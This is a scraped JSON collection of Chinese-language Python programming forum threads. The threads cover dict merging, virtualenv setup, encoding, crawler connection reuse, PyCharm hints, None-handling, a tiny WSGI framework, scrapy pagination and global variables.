{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>For example</h2>\n<p>d 合并后变成 new_d</p>\n<pre><code>d = [\n {1: [12, 24]},\n {1: [24, 36]},\n {2: [111,222]}\n ]\n\nnew_d = [\n {1: [12, 24, 36]},\n {2: [111, 222]}\n ]\n</code></pre>\n</div></div>", "<div class=\"topic_content\">谢谢老哥们，已经解决了</div>"], "reply": "7", "tittle": "有一个成员是字典的列表，如何把其中 key 相同的字典的 value 合并一下", "comment": ["既然是列表，貌似一般就是遍历了吧，用 set 来做字典的 value 。最后再遍历一次把 set 转换为列表。", "s = {k: set() for x in d for k,v in x.items()}\r", "[s[k].update(v) for x in d for k,v in x.items()]\r", "{k: list(v) for k,v in s.items()}", "[ {id: val} for (id, val) in [[(new_d, new_d.update({k: new_d.get(k, set()).union(set(v))})) for (k, v) in m.items()] for m in d][0][0][0].items() ]", "new_d = {}", "另外一种思路，前提是 d 得排序好\r", "\r", "from itertools import groupby, chain\r", "[{k: [x for x, _ in groupby(sorted(chain(*[v[k] for v in g])))]} for k, g in groupby(d, lambda x: list(x.keys())[0])]", " 厉害了"]},
{"content": "", "reply": "5", "tittle": "请问怎样用 pyenv+virtualenv 将虚拟环境创建到工程项目目录下而不是默认的.pyenv/versions/目录下", "comment": ["$ pip install virtualenvwrapper \r", "$ export WORKON_HOME=~/.envs\r", "$ mkvirtualenv my_env", "$ pyenv shell 3.5.0 && pip install virtualenv && virtualenv venv && source venv/bin/activate", " 这也没法建到工程目录下面吧。。。", " 不好意思！之前试错了！确实可以！感谢！🙏", " YOU ARE VERY WELCOME!!! 😀😀😀"]},
{"content": ["<div class=\"topic_content\">从网页上提取了一段字符出来， x=u'\\u7535\\u8bdd\\u89c6\\u9891\\u4f1a\\u8bae\\u64cd\\u4f5c\\u6d41\\u7a0b'，已知网页的编码是 gb2312 的方式，现在想看到 x 的中文是什么，怎么处理？</div>"], "reply": "8", "tittle": "求助：关于 Python 编码的问题", "comment": ["如果是 python2 的话，直接 print(x)即可。如果是 python3 的话不会存在这个问题。", " 谢谢， print x 果然可以显示出来，那怎么让 x 变成正常显示的字符串？", "在 python2 中，字符串就是长这样的，没法改变。它其实就是一个正常的字符串，只是显示的是 utf-8 编码而已，你可以对它进行任何正常的操作。如果你是强迫症患者，一定要让它显示中文的话，那么只有用 python3 了。", "懒得研究 python 2 的编码问题，所以转 3 了。", "x 是 Unicode codepoint 序列（ Python 2 中的类型是 unicode ， Python 3 中的类型是 str ）\r", "可以通过 x.encode() 转换为字节序列（ Python 2 中的类型是 str ， Python 3 中的类型是 bytes ）", "x.encode('utf-8')", "x.encode('gbk')   吧....", "电话视频会议操作流程   。。。。 utf8 的"]},
{"content": "", "reply": "1", "tittle": "用 anaconda spyder 写了个程序爬网页，加了时延加了很多 try,except；每爬大概 600 个之后程序就卡死了， console 按 ctrl+c 也没反应，总内存用了不到一半，究竟是哪出了问题...", "comment": ["多 print 一些信息， 看停留在什么地方了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在想使用 python 实时收取 163 企业邮箱，怎么搞？\n参考了廖雪峰的代码，可以实时接收 <a href=\"http://yeah.net\" rel=\"nofollow\">yeah.net</a> 的网易邮件，就是企业邮箱搞定不了</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 实时接收 163 企业邮箱的邮件？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python3.6 + Pycharm pro 2016.3.2\n已经把各种自动补全、代码提示都打开了</p>\n<p>例如： threading.Lock 提示是变量， threading.RLock()是方法，\nlock=threading.Lock(); lock.acquire() 是提示不出来的，但执行没问题，</p>\n<p>再比如：安装了 PyMySQL\npymysql.connect()完全不提示。</p>\n<p>请问这是为什么？</p>\n</div></div>"], "reply": "4", "tittle": "我用 Pycharm pro 开发，为什么有些代码没有自动提示，但可以执行", "comment": ["Pycharm 需要索引你的安装包才会提示的", "那为什么 threading 模块下有的可以提示，有的不行呢", "pycharm 的类型推断逻辑 参考这个\r", "\r", "\r", "Lock 是 threading 下的一个类，应该是这个类描述没遵循任何一条规则，所以推断不出来。。", "这是因为：\r", "\r", "* threading 是对_thread 模块的高级封装\r", "* 看这里： ", "\r", "\r", "```python\r", "_allocate_lock = _thread.allocate_lock\r", "```\r", "\r", "* 还有这里： ", "\r", "\r", "```python\r", "Lock = _allocate_lock\r", "```\r", "\r", "因为 Python 中所有东西都是对象，所以，其实 PyCharm 并没有错。 threading.Lock 其实只是_thread.Lock 的一个别名。而_thread.Lock 是 C 写的 Python 对象，具体根据系统不同调用系统的信号量\r", "\r", "至于 RLock ，看这里 "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在学 Django ，搭建了一个校园二手交易平台。有兴趣的童鞋看看哈</p>\n<p>校园二手信息发布平台\ngithub 地址： <a href=\"https://github.com/starbt/flea_market\" rel=\"nofollow\">https://github.com/starbt/flea_market</a></p>\n</div></div>"], "reply": "22", "tittle": "用 Django 搭建一个校园二手信息发布平台，感兴趣的童鞋来看看哈", "comment": ["丑哭了，能美化下？\r", "随便用个前端框架不至于啊", "看漏了没想到你已经用了 bootstarp ，可是为什么看上去像是自己写的 css", "跟我以前在大学时搭的二手信息平台几乎一样啊，包括外观。记得当时是参考了 csdn 上一个博主的 django 购物教程😂", "用上 bootstrap 这种框架，不需要自定义什么样式，只是把元素对齐就可以获得一个不错的效果。整齐一些会有很大的改善。", "这 UI 不就是华科二手街么?", "你们项目需要一个设计师（虽然这类东西很常见）", "真是美哭了 😂", "没有必要太打击。对 @", " 表示一下鼓励！\r", "\r", "人家这不过就是学 Django 做个 demo 分享一下，不能按 production 的要求去要求。\r", "\r", "不过大家的意见，其实也很中肯。\r", "\r", "加油吧！", "很棒，如果使用的 Python3 我都想加到我的网站上去\r", "可以交流一下哈 ", "比我第一次做的网站好多了", "也比我第一次做的网站好多了。。", "我做的那个二手平台跟题主做的差多了，无论是前台还是后台功能，楼主可以的。", "lz 既然用了 bootstrap, 那么 form.py 里 field 属性的 widget 的 attr 可以加 bootstrap 的表单 class 啊 (form-control) ,更和谐\r", "很棒", "谢 LZ,已 star,学习学习。", "UI 丑爆了...", " 注册页面设计的不错。  有个小错误，用户名输入框的 placeholder ，用于登陆请牢记， 应该是登录", "这种平台很适合卡片式布局，电脑和数码配件那里，产品都挤在一起了，至少留点空白吧。在 v2 发作品， ui 被吐糟是常事，这没什么， lz 加油", " 你好,能分享下那篇学习的文章吗？我也想学习下", " ", " 就是这个了", " 感谢", "本项目是用     pyhton     +django 搭建的一个校园二手市场信息发布平台"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Hi ，各位</p>\n<p>最近在搭建 openstack 调试环境，在虚拟机中配置了环境，但是通过 pycharm 调试时总是提示下面的错误，哪位帮忙定位一下？</p>\n<pre><code>2017-03-06 20:39:22.637 DEBUG nova.osapi_compute.wsgi.server [req-023361de-cfff-4dfb-8d11-953c3b2619b2 None None] (50530) accepted ('192.168.150.129', 55309) from (pid=50530) server /usr/local/lib/python2.7/dist-packages/eventlet/wsgi.py:868\n2017-03-06 20:39:23.516 INFO nova.osapi_compute.wsgi.server [req-11822637-16c8-464e-8052-f4c99125cee6 admin admin] 192.168.150.129 \"GET /v2.1 HTTP/1.1\" status: 302 len: 251 time: 0.8773770\n2017-03-06 20:39:23.551 DEBUG nova.api.openstack.wsgi [req-9c43716d-4b21-4ea6-b41d-25f10a1c3ad8 admin admin] Calling method '&lt;bound method VersionsController.show of &lt;nova.api.openstack.compute.versionsV21.VersionsController object at 0x7fb79c5bfc50&gt;&gt;' from (pid=50530) _process_stack /opt/stack/nova/nova/api/openstack/wsgi.py:626\n2017-03-06 20:39:23.553 INFO nova.osapi_compute.wsgi.server [req-9c43716d-4b21-4ea6-b41d-25f10a1c3ad8 admin admin] 192.168.150.129 \"GET /v2.1/ HTTP/1.1\" status: 200 len: 722 time: 0.0354731\n2017-03-06 20:39:23.731 DEBUG nova.api.openstack.wsgi [req-a4c33e38-44e2-475a-b829-160545bdb6a4 admin admin] Calling method '&lt;bound method ServersController.detail of &lt;nova.api.openstack.compute.servers.ServersController object at 0x7fb79c61e810&gt;&gt;' from (pid=50530) _process_stack /opt/stack/nova/nova/api/openstack/wsgi.py:626\nTraceback (most recent call last):\n  File \"/usr/local/lib/python2.7/dist-packages/_pydevd_bundle/pydevd_process_net_command.py\", line 268, in process_net_command\n    type, file, line, func_name, suspend_policy, condition, expression = text.split('\\t', 6)\nValueError: need more than 6 values to unpack\n</code></pre>\n<p><img alt=\"pycharm remote debug\" src=\"https://o8oxd8b1h.qnssl.com/pycharm-remote-debug.png\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "pycharm remote debug openstack nova-api 报错", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在改进学校学长学姐的一些项目，感觉代码结构组织的一团糟，现在又不好做大的修改。</p>\n<p>他们的代码一个明显的问题就是很多函数或者方法的调用，如果相关结果不对，就直接返回 None(或者 False)。这样的后果是，等程序真正出了问题的时候，除了一步步 debug<strong>我很难找到这个 None 到底是哪个地方返回的</strong>。</p>\n<p>我现在的想法是重新修改代码，在有可能返回 None 的地方，我自己重新检查一遍返回结果是否为 None ，如果返回结果是 None 我自己另外再做处理。但是这样感觉写出的代码太丑陋了，代码里面充满<code>if xxx is None</code>式检查语句。</p>\n<p>请问 V 站各位前辈对于上面这种情况我应该如何优雅处理？</p>\n</div></div>"], "reply": "12", "tittle": "如何优雅解决业务代码中必须要重复的嵌套检查返回结果是否为 None？", "comment": ["这是异常处理？\r", "如果出异常了，需要中断处理，那么就抛异常。\r", "如果出异常了，可以继续执行，那么就忽略异常，一般就返回 None 了。", "关键步骤记日志？", " @", " \r", "他们的代码的本意应该就是出了异常，认为可以忽略异常，然后就返回 None 。但是这样的做法假设有一个函数或者方法，它被**嵌套**调用了多次，所以在一系列嵌套调用的过程必须每一次都要检查 None ，要不然等出了错就不知道异常到底是哪一步骤抛出来的。\r", "\r", "我现在有两种做法：\r", "1. 原本返回 None 的地方我不兼容异常，全部抛出\r", "2. 在返回 None 的地方做检查，并且记录日志，但是这样的话代码结构会很丑\r", "\r", "请问上面做法是否合理？", "这个问题，我觉得可以等同于：请问 V 站各位前辈不得不吃屎时是如何优雅处理的？\r", "\r", "其中的煎熬难以言喻，其路漫漫，其修远兮~", "   把鼻子堵上，", "先为现有的业务逻辑建立一些测试用例，然后再开始修改现有实现，保证前面的测试用例通过，逐步修改", "把需要用到的代码封装一下再用", "装饰器不就是在这时候用的吗。", "1 可以把一些逻辑拆出来。然后写单元测试~\r", "2 抛出异常，捕获异常写日志~~", "try catch 就是这个时候用的啊。我一般是喜欢 在关键部分： try: except KeyError xxx except IndexError.....", "Python 不熟，但 script 类语言应该都可以写一个调用函数的函数解决：_call_func 有 3 个参数，函数名，参数个数，参数对象数组（或集合什么的能放下所有种类对象的）。 用这个函数调用所有的其他函数，在这个函数里面检查返回值，如果是 none ，就抛出异常，或者打印函数名称。 对象方法也可以，重载_call_func 第一个参数是对象，第二个参数是对象的方法，其他一样。然后把所有直接调用都改成调用函数调用。", "用日志打印出来吧，出问题 返回 None 之前，先把 当前的函数名打印出来，再返回。"]},
{"content": ["<div class=\"topic_content\">我弄了一个爬虫程序， 没有把服务器爬死，倒是把自己网络经常弄挂，\r<br>\r<br>大概就是用 gevent 创建一个 Pool(50) , 50 个并发，\r<br>\r<br>用 Requests 来迭代 （有打 m onkey patch ）\r<br>\r<br>url 大概是接近 10000 个， \r<br>\r<br>速度其实还挺快的， 一秒能处理接近 300 个 requests ， for 迭代，没有 sleep\r<br>\r<br>但是现在的问题是，每次连续处理 3000 个左右还好，再多了，经常就把本地网络弄挂了，导致程序也 timeout 退出。\r<br>一两分钟内，经常网络也连不上。不知道是不是我程序写的太耗系统资源，可能要稍微在一段任务后休息一下。\r<br>\r<br>现在的解决办法就是， 把任务分成小块，每块大概 2000 个， 每爬了 2000 个就休息几秒。 \r<br>\r<br>有没有更科学的方法，或者是我哪里使用不当？</div>", "<div class=\"topic_content\">看到楼下都说路由器的问题，我猜应该也是路由器的问题。\r<br>\r<br>同样的代码在阿里云服务器上跑，毫无压力。\r<br>\r<br>我自己的路由器按说已经是家用里很好的了， Netgear 的 3000 多，\r<br>\r<br>换别的路由连接方式也不大可行，因为还有很多其他电脑，加上物理距离，不大可行。\r<br>\r<br>\r<br>那目前看，好像也只能自己控制减慢并发请求的速度了。</div>", "<div class=\"topic_content\">最后发现， 路由器表示不背锅， 是我的程序写的有问题\r<br>\r<br>在 gevent 调用的函数里面，我直接用的 Requests.get 来下载页面，这个方式下不能复用连接，也没有主动去调用关闭，所以程序保持了几千个服务器之间的连接，最后把路由器玩死了。\r<br>\r<br>\r<br>现在修改成用 session 来 get ，一切完美了，速度也快了好多。\r<br>\r<br>\r<br>nCount = 50\r<br>connection_limit = nCount\r<br>adapter = requests.adapters.HTTPAdapter(pool_connections=connection_limit, \r<br>                                        pool_maxsize=connection_limit)\r<br>session = requests.session()\r<br>session.mount('http://', adapter)\r<br>\r<br>fetchpool = Pool(nCount)\r<br>for job in jobs:\r<br>        fetchpool.spawn(self.foobar, session, job)\r<br>fetchpool.join()\r<br>\r<br>\r<br>\r<br>def foobar(self, session, job):\r<br>      session.get(......)</div>"], "reply": "23", "tittle": "爬虫把自己爬死了。。。。点解？", "comment": ["换个好路由器.", "感觉是：请求太多了，一次发不出那么多请求，全排路由缓存里了，然后把缓存挤爆了后面的都排不进去了就超时了，然后处理这些请求花了一两分钟，换个加宽带宽，然后异步请求更好一点", "1L+1\r", "如果有在用路由,先尝试不用路由,再跑一下.如果有用光猫把光猫改成桥接,直连电脑然后电脑拨号跑一下试试.\r", "\r", "我前段时间也是写爬虫,就是这个问题,最开始,1 秒撑死直接处理不到 1000 个请求,上行带宽只用了不到 10M.后来去掉路由有提升但是还是没跑满,又把光猫改成桥接电脑直接拨号,问题就解决了.\r", "\r", "所以,如果你确定代码没问题的话,检查一下自己网络会经过的设备,挨个排查吧.", "可以确认 LZ 不玩 P2P ，是个好孩子", "我也怀疑是路由器，这个是华为的 3000 多的路由器，按说不至于这么脆弱啊。\r", "\r", "我确实在阿里云上测试过，毫无压力。", "说错了， netgear 的路由器", " NetGear 3000+的路由器，，那只可能是 R9000 了？", "  R8500 \r", "\r", "现在在外面一个小茶楼， 居然这边的网络也毫无压力。。。。\r", "看来是我家里有设备有问题，我中间搭配了几个光猫，还有个苹果的 Airport Extreme", "肯定是路由器设置问题. 找找一般抗攻击之类的设置.", "不要开 Qos ， 网件的 Qos 好奇怪，连测速的都给搞一下。", " 我没有开 Qos", "记得以前用 zmap ，速度过快就全堆内存里了， 24G 内存堆满就报错，网卡还要处理十分钟", "楼主广东人？", " 把家里的网络拓扑图贴出来让大家看看呗？", "端口刷太多，然后不释放，锁死了？？", "家用宽带应该有最大连接数限制吧。", "本机 gevent+requests 跑百万 url 没问题，路由器应该事设置有问题吧", "求个 python 爬虫工程师，两年爬虫经验。\r", "暴风体育  ", "\r", "\r", "跪求人才，欢迎咨询。", "用软路由试试吧！", "量太大了，家用路由器扛不住的，我的 R8000 和 6300 被我跑崩好多次", "最后发现， 路由器表示不背锅， 是我的程序写的有问题\r", "\r", "在 gevent 调用的函数里面，我直接用的 Requests.get 来下载页面，这个方式下不能复用连接，也没有主动去调用关闭，所以程序保持了几千个服务器之间的连接，最后把路由器玩死了。\r", "\r", "\r", "现在修改成用 session 来 get ，一切完美了，速度也快了好多。\r", "\r", "\r", "nCount = 50\r", "connection_limit = nCount\r", "adapter = requests.adapters.HTTPAdapter(pool_connections=connection_limit, \r", "                                        pool_maxsize=connection_limit)\r", "session = requests.session()\r", "session.mount('http://', adapter)\r", "\r", "fetchpool = Pool(nCount)\r", "for job in jobs:\r", "        fetchpool.spawn(self.foobar, session, job)\r", "fetchpool.join()\r", "\r", "\r", "\r", "def foobar(self, session, job):\r", "      session.get(......)\r", "\r", "\r", "\r", "不过，之前也没留心，我的路由器也有一些问题，非常不稳定，尤其是 wifi ，干扰严重，即使我已经选择了别人都没有用的 channel", "几千的连接就能跑挂..\r", "\r", "我是建议先把渣渣网件固件换了\r", "啊 8500 啊，那再见...", "网络搞挂就只能升级网络了啦~\r", "说到爬虫，我这里给分享个爬虫的学习笔记 \r", " 12 天从入门到精通 python 爬虫 /"]},
{"content": ["<div class=\"topic_content\">求 ML-From-Scratch 的中文学习资料\r<br>E 文看着好累</div>"], "reply": "目前尚无回", "tittle": "求 ML-From-Scratch 的中文学习资料", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2><a href=\"http://Yande.re\" rel=\"nofollow\">Yande.re</a> 图片爬虫</h2>\n<h3>前言</h3>\n<p>每天打开电脑第一件事，就是打开<a href=\"https://yande.re/post\" rel=\"nofollow\">Y 站</a>，看看又更新了哪些图片、其中又有哪些适合作为壁纸</p>\n<p>日久天长，总会感觉浪费时间精力，每天都要在一堆图片里找 PC 壁纸</p>\n<p>这可不符合我作为一个码农的身份</p>\n<p>正好最近想学学<code>Python3</code>，于是一边看着<a href=\"http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000\" rel=\"nofollow\">廖学峰的 Python 教程</a>一边撸出来这个项目。写得很差，轻喷</p>\n<p>本项目基于<code>Win7</code>、<code>Python3.5.2</code>开发，其他环境下未测试</p>\n<h3>功能</h3>\n<ul>\n<li>支持从指定的<strong>开始页码</strong>爬取到<strong>结束页码</strong></li>\n<li>也支持从<strong>第一页</strong>爬取到<strong>上一次开始爬取的位置</strong></li>\n<li>支持设置爬取的<strong>图片类型</strong>（全部、横图、竖图、正方形）</li>\n<li>支持最大或最小<strong>图片尺寸</strong>、<strong>宽高比</strong>限制</li>\n<li>按照当天的日期创建目录并存放爬取的图片</li>\n<li>爬取结束后会在图片目录下生成日志文件</li>\n</ul>\n<h3>如何使用</h3>\n<p><strong>必须</strong> 编辑<code><a href=\"http://Function.py\" rel=\"nofollow\">Function.py</a></code>第<code>5</code>行，将该变量的值设为自己想要的目录，程序将会自动创建，路径必须以斜杠结尾</p>\n<ul>\n<li><strong>方案一</strong>：如果想要从<strong>开始页码</strong>爬到<strong>结束页码</strong>，请修改<code><a href=\"http://index.py\" rel=\"nofollow\">index.py</a></code>第<code>12</code>行和第<code>15</code>行的两个变量；</li>\n<li><strong>方案二</strong>：如果想要从<strong>开始页码</strong>爬取到<strong>上一次开始爬取的位置</strong>，请修改<code><a href=\"http://index.py\" rel=\"nofollow\">index.py</a></code>第<code>15</code>行的值为<code>0</code>。还有<code>last_start_id.data</code>的内容，改为某张图片的 id 即可。爬到此图片时程序将停止。该方案下推荐将<strong>开始页码</strong>设为<code>1</code>，相当于每次执行都只从新增的图片中爬取</li>\n</ul>\n<blockquote>\n<p>例如某图片的详情页 Url 为：<code><a href=\"https://yande.re/post/show/346737\" rel=\"nofollow\">https://yande.re/post/show/346737</a></code>，则图片 id 为<code>346737</code></p>\n</blockquote>\n<p>然后命令行执行<code>python <a href=\"http://index.py\" rel=\"nofollow\">index.py</a></code>即可（ Windows 下）。 Linux 下可直接执行</p>\n<h3>注意事项</h3>\n<p>值得一提的是，无论使用哪种方案运行，<code>last_start_id.data</code>的内容都会被自动修改为爬取到的第一张图片的 id</p>\n<p>这样做的目的是为了实现<strong>方案二</strong>，相当于每次执行都只从新增的图片中爬取。比较适合设置为自动运行之类的</p>\n<h3>项目地址</h3>\n<p><a href=\"https://github.com/mokeyjay/Yandere-crawler\" rel=\"nofollow\">https://github.com/mokeyjay/Yandere-crawler</a></p>\n</div></div>"], "reply": "5", "tittle": "萌新边学边写、基于 Python3 的 Yande.re 图片爬虫", "comment": ["酷！", "mark", " 我在写这个程序的时候也注意到了……并发会导致被禁止访问一阵子，所以最终成品是单线程的……跟我手动访问也差不多啦", "66666666,大神给跪"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>PAT Basic 1028 <a href=\"https://www.patest.cn/contests/pat-b-practise/1028\" rel=\"nofollow\">https://www.patest.cn/contests/pat-b-practise/1028</a>\n思路很简单，但用 py3 老是在最后一个测试点超时，在网上找的 py2 答案却没这个问题。 PAT 提供 3.4.2 和 2.7.9 。抄来的代码如下。把 raw_input 和 print 改了也没用...</p>\n<pre><code>from sys import exit    \n\ndef isValid( birth ):\n    if birth &lt;= \"2014/09/06\" and birth &gt;= \"1814/09/06\":\n        return 0\n    else:\n         return 1    \n\nstr = raw_input()\nnum = int(str)\nmax = []\nmin = []\nvalidNum = 0    \n\nfor i in range(num):\n    tmp = raw_input().split()\n    if isValid( tmp[1] ) == 0:\n        validNum += 1                              \n        if len(max) == 0 or max[1] &gt; tmp[1]:\n            max = tmp    \n\n        if len(min) == 0 or min[1] &lt; tmp[1]:\n            min = tmp\nif len(max) != 0:\n    print validNum, max[0], min[0]\nelse:\n    print '0'    \n\nexit(0)\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "做 OJ 时为什么 Python3 慢过 Python2？", "comment": ["py3 就是比 py2 慢，至少 3.6 之前是", "我一直以为 Python 3 比 Python 2 快来着。。。。。。。 Orz\r", "\r", "具体还是应该看代码吧，比如 Python 3 中大量使用了生成器，`xrange`取消了，`range`的效果等同于 Python 2 中的`xrange`，但是 Python 3 的`range`要比 Python 2 的`xrange`慢不少，看这里：\r", "\r", "```\r", "$ python3 -m timeit -s\"r = range(33550336)\" \"for i in r: pass\"\r", "10 loops, best of 3: 835 msec per loop\r", "\r", "$ python2 -m timeit -s\"r = xrange(33550336)\" \"for i in r: pass\"\r", "10 loops, best of 3: 464 msec per loop\r", "```\r", "\r", "代码来自： ", "\r", "\r", "还有很多 filter 、 map 之类的函数都变成了返回生成器一样的对象。\r", "但是。。。。。为啥 Python 3 比 Python 2 慢啊？这不科学啊。。。。", " 为啥？ Python 3.6 有什么大的改进吗？", "都 python 了,没必要比这点快慢了吧......\r", "开发快才是真的快", " 刷题也快，能用 py 过就肯定用 py 。", "应该和 dict 的效率有很大的关系吧", " 没用到 dict 啊。但 dict 基于 hashmap ， get 的效率不低吧？", " Python 内部用到 dict 的地方很多啊，比如说在交互模式下，`a=1`一共会创建并销毁 15 个字典对象。我这里测试 2.7 和 3.5 dict 的效率差很多啊。", " 这就尴尬了， 3.6 会比 2.7 快吗？", " 刷题有影响。有些时候一个相同的算法，用 C/C++/Java 都能过， Python 却会 TLE ， Orz"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>我用极少的代码了实现一款 web 框架，目标是用低于 1000 行的代码实现 flask 的核心功能， xweb 框架基于 python3.5 以上开发，实在是居家旅行良品．</p>\n</blockquote>\n<p>github 地址：<a href=\"https://github.com/gaojiuli/xweb\" rel=\"nofollow\">https://github.com/gaojiuli/xweb</a></p>\n<p>我的目标是用最少的代码实现符合现状的 web 框架，欢迎同样有兴趣的同学一起参与进来</p>\n<h2>说明</h2>\n<p>基于3.5开发</p>\n<h2>安装</h2>\n<p>pip install xweb</p>\n<h2>基本用法</h2>\n<pre><code>from xweb.application import XWeb\n\napp = XWeb()\n\n\n@app.route('/:name/')\ndef call_my_name(name):\n    return 'hi {}!'.format(name)\n\n\napp.listen(3000)\n</code></pre>\n<h2>请求与相应</h2>\n<pre><code>from xweb.globals import request\n\nrequest.path\nrequest.query_string\nrequest.query\nrequest.files\nrequest.forms\nrequest.json\nrequest.ip\nrequest.hostname\nrequest.headers\n\n\n\nfrom xweb.globals import response\n\nresponse.headers\nresponse.status\nresponse.body\n</code></pre>\n<h2>中间件</h2>\n<pre><code>from xweb.application import XWeb\n\napp = XWeb()\n\n@app.middleware('request')\ndef print_on_request1():\n    print(\"I print when a request is received by the server1\")\n\n\n@app.middleware('request')\ndef print_on_request2():\n    print(\"I print when a request is received by the server2\")\n\n\n@app.middleware('response')\ndef print_on_response1():\n    print(\"I print when a response is returned by the server1\")\n\n\n@app.middleware('response')\ndef print_on_response2():\n    print(\"I print when a response is returned by the server2\")\n\n@app.route('/:name/')\ndef call_my_name(name):\n    return 'hi {}!'.format(name)\n\n\napp.listen(3000)\n</code></pre>\n<p>我的目标是用最少的代码实现符合现状的 web 框架，欢迎同样有兴趣的同学一起参与进来</p>\n<p>github 地址：<a href=\"https://github.com/gaojiuli/xweb\" rel=\"nofollow\">https://github.com/gaojiuli/xweb</a></p>\n</div></div>", "<div class=\"topic_content\">1. 补充了大部分测试用例\r<br>2. 有兴趣的朋友，可以一起参与进来， todo 列表里的东西都是要实现的</div>"], "reply": "28", "tittle": "xweb: 一款无依赖的 Python web 框架(低于 500 行代码)", "comment": ["随便看了一眼。\r", "\r", "![]( ", " )", "那个。。。 method not allowed 不是 405 么😓", "def listen(self, port):\r", "        from wsgiref.simple_server import make_server\r", "        server = make_server('127.0.0.1', port, self)\r", "        print('serve on 127.0.0.1:{port}'.format(port=port))\r", "        server.serve_forever()\r", "....建议把这个裁了。。。换成可以使用任意 wsgi", "坐等日志、队列、 ORM(Postgresql&MySQL)。\r", "\r", "讲真 Auth 就不要了", " 状态码从网上搞得，还没有专门整理", " 雪亮的眼！", " 这个是开发阶段选用的，只要符合 wsgi 就可以，实际部署的时候应选用 uwsgi 等工具", " orm 我会重新启动一个项目，思路是分离出 django orm ，删减不常用的功能。我不打算把 orm 耦合进来，但是针对 xweb 定制一款符合现状的 orm 系统还是必要的。队列与日志同理，采用无耦合的形式开发。", "想法不错\r", "\r", "不过要说代码少的话，其实有个框架叫 bottle 的，记得代码很少，不知道还有人在用么", " 我的灵感来自 bottle ， flask 和 sanic 三款框架，其中 bottle 和 flask 中为了 python2.7 添加太多代码，而 sanic 并非基于 wsgi ，有太多的依赖。这是我的初衷", "这种库居然也能说成框架", " 可以啊， web.py 还是框架呢", " 哦。你这个也就是一个 action dispatcher ，一个框架重点在于 ORM", " 如你所说的话,Flask 和 Sanic 也不算框架咯?", " 很多框架都不自带 ORM ，怎么成重点了", " orm 在我的计划之中，但是我不打算将它们耦合起来就像现在 Django ，我要的效果是 xweb 能快速地使用 peewee ， sqlalchemy 等 orm ，也能用针对它开发的 orm 。同时这个 orm 应当能够和 flask ， sanic 等结合使用。而不是强耦合地植入。", "模板语言也不搞了吧。\r", "\r", "json 部分弄好一点，实用性提高不少。", " 你的想法和我一样， xweb 简化满足用于接口开发即可", "其实我只想要一个类似 php 那种一键部署的傻瓜工具", " 感谢你的建议， python 可以很容易实现傻瓜地部署，我会在项目完整后编写这样的脚本。", " 我在写的 web 框架也是这样搭建测试 HTTP 的，（基本所有 python web 框架都是使用 wsgiref 的 make_server 来本地测试的）\r", "\r", "他这种写法并没有问题。 是要是对象里面有 __call__ 函数 满足 wsgi 就可以了。", "闲着没事的话可以给 bottle 增加 asyncIo 支持，就像 sanic 对 Flask 做的一样。", " 我可不乐意写那些兼容 python2 的代码", "简单易懂，学习下，看看有没有机会做点贡献", "建议去完善 sanic ，而不是再造一个轮子", " sanic 使用 uvloop ，造成了无法使用像 flask 中的全局变量 request,response,g 等，并且它依赖于 aiofiles ， httptools ， ujson ， uvloop 这几个库，如果这几个库更新，那么 sanic 不得不被牵着鼻子走.　我想实现的是无第三方依赖，并且摒弃 python2 ．", " bottle 本来就是兼容 Python2 和 3 的，但是 bottle 现在不支持 asyncio 。", " 我的意思是既然开发基于 python3, 那么所有为了 Python2 而生的代码都是多余的."]},
{"content": ["<div class=\"topic_content\">初学 Python ，在用 scrapy 来爬取豆瓣读书练习。目前爬取单页面的书籍没有问题\r<br>\r<br>在用 scrapy 提供的 Rule 和 LinkExtractor 模块练习爬取多页面的时候，始终无法获取的到下一页的结果，折腾一天无解\r<br>爬虫主要代码在下面，请各位给看看问题所在，感谢！\r<br>\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/loricheung/b51503a835aa8b8af238b99a4104fb21\">https://gist.github.com/loricheung/b51503a835aa8b8af238b99a4104fb21</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div></div>"], "reply": "9", "tittle": "请教使用 scrapy 爬取豆瓣读书的时候，无法多页面爬取的解决办法", "comment": ["return book --> yield book", "LinkExtractor 的正则写错了  r'/tag/小说\\?start=\\d+'", " return 也可以", "不知道你这是不是 Python2  可能要加 u  ur'/tag/小说\\?start=\\d+'", "你没有加翻页功能吧，加上翻页判断。", " 使用的 Python3 ，正则表达式我测试过，可正确检测到对应的链接文本", " scrapy 框架已经帮做了这个事情", "问题出在 rules 上， callback 随便重新写个函数，不用覆盖 parse 就行了", " 确实是这个问题。很奇怪，我在开始使用 Rule 来爬取多页的时候，就把 callback 函数重写了，但是当时也是只能只能爬取单个页面……"]},
{"content": ["<div class=\"topic_content\">shell 的函数中如果没写 return ，在调用的时候相当于调取了函数中的所有内容，但 python 中如果不写 return 只会返回 None ，请问在 python 中怎样实现 shell 那样的函数调用，调取一个函数中的全部内容？</div>"], "reply": "7", "tittle": "问个菜鸟问题，关于函数", "comment": ["尴尬了，看不懂。。。", "同没看明白，说的啥意思", " @", " \r", "\r", "比如在 shell 里：\r", "example(){\r", "a=1\r", "}\r", "\r", "example\r", "\r", "echo $a\r", "\r", "运行后输出 1\r", "\r", "在 python 里如果不写 return ，返回的值就是 None ，", "python 里可以做到 shell 这种形式的函数调用吗 无需写明 return 具体返回值 调用函数中的所有语句", "虽然很困难，但是我觉得我肯定猜中了你的意思。我猜你的问题应该是在 python 函数内部给一个临时变量赋值，但是它在函数的外层没法表达出来，除非 return 它，对吗？\r", "\r", "如果是的话，解决办法是在赋值 a 的上一行声明一句\r", "```\r", "global a\r", "```", "全局变量？", "ok 是全局变量 明白了 感谢大家"]},
